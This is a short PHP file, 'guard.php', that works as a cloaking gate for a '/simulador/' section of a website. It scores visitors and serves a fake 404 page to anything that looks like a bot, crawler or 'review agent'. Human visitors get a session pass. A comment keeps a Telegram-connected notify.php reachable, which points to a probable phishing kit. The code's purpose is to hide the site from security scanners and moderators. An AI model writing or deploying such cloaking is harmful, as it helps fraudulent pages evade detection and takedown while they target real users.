<?php
// ─────────────────────────────────────────────────────────────
// simulador/guard.php
// Gate guard for everything inside /simulador/
// Uses the parent _lib.php scoring system.
// If the visitor looks like a bot/crawler → 404 / blank response.
// NOTE: do NOT include this from notify.php (Telegram needs in).
// ─────────────────────────────────────────────────────────────

require_once __DIR__ . '/../_lib.php';

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Visitors that already passed /index.php get a free pass for a while
$has_pass = isset($_SESSION['gate_pass']) && (time() - intval($_SESSION['gate_pass']) < 3600);

if (!$has_pass) {
    [$score, $reasons] = gate_compute_score();

    if ($score >= 8) {
        // Bot / crawler / review agent → block silently
        http_response_code(404);
        header('Content-Type: text/html; charset=UTF-8');
        header('Cache-Control: no-store');
        echo "<!DOCTYPE html><html><head><title>Not Found</title></head>";
        echo "<body><h1>404 Not Found</h1></body></html>";
        exit;
    }

    // Real visitor accessing simulador directly → mark as passed
    $_SESSION['gate_pass'] = time();
}
